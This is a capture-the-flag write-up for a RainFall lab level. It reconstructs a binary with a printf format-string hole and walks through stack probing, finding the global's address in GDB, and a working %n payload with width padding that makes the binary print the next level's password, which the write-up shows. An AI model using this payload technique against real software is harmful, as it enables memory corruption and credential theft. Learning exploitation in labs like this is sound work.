# level4

Let's analyze the code.

Here is the reconstructed C code of the binary:
```c
#include <stdio.h>
#include <stdlib.h>

int m = 0;

void p(char *param_1) {
    printf(param_1);
}

void n(void) {
    char local_20c[520];
    
    fgets(local_20c, 0x200, stdin);
    
    p(local_20c);
    
    if (m == 0x1025544) {
        system("/bin/cat /home/user/level5/.pass");
    }
}

int main(void) {
    n();
    return 0;
}
```

The `main` function calls `n`, which reads our input via `fgets` and passes it to `p`. Inside `p`, the binary executes `printf` with the same format string vulnerability as the previous level. The only difference is the target value we are comparing against: `0x1025544`.

In decimal, `0x1025544` is `16930116`.

This is a very large number—too large to write out literally in the input buffer since `fgets` caps our input length at `0x200` (512 bytes).

To print `16930116` characters without writing them out literally, we can leverage `printf`'s width formatting flags. For example, if we need to print spaces before a number, instead of writing them manually:
```c
printf("%10d", 42);
```
This outputs the value `42` padded with leading spaces to span a total width of 10 characters. We can combine this width padding technique with our parameter selector (`$`) and `%n` to perform the exploit.

### Stack Mapping and Address Analysis

Let's explore the stack first:
```bash
level4@RainFall:~$ ./level4 
aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
aaaa b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 ...
```
Here, the value `61616161` (`aaaa`) appears at the **12th** argument position. Next, we determine the address of the global variable `m` using GDB:
```text
(gdb) info variables m
All defined variables:
...
0x08049810  m
```
The address of `m` is `0x08049810`.

### Building the Payload
- Target Address of `m`: `0x08049810`
- Target Value: `16930116`
- Stack Offset: `12`

We place the 4-byte address of `m` at the beginning of our input string. We need `16930116` characters printed in total. Since the address occupies 4 bytes, we need `16930116 - 4 = 16930112` characters of padding. Then we use `%12$n` to write this count to the address at position 12.

Using `[::-1]` to write the target address in little-endian format, we build the payload command:
```bash
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"' > payload
```

And run the exploit:
```bash
(cat payload; cat) | ./level4
```
This prints the password for `level5`:
```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
